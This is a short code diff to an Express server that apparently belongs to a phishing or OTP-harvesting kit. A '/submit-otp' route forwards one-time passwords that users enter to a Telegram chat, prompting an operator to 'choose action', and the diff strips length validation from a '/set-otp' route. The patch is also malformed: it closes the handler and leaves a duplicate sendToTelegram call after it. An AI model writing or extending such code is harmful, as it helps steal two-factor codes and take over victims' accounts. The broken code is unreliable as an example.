@@ -123,9 +123,7 @@ app.get("/", (req, res) => {
 app.post("/set-otp", (req, res) => {
   const { otp } = req.body;
 
-  if (otp !== 5 && otp !== 6 && otp !== null) {
-  return res.json({ success: false });
-}
+  
 
   otpLength = otp;
 
@@ -153,8 +151,18 @@ app.post("/submit-otp", async (req, res) => {
 
 ${otp}
 
-👇 Choose action
+👇 Choose action below
 `;
+
+    await sendToTelegram(message);
+
+    res.json({ success: true });
+
+  } catch (err) {
+    console.log("OTP ERROR:", err.message);
+    res.json({ success: false });
+  }
+});
 
     await sendToTelegram(message);
 
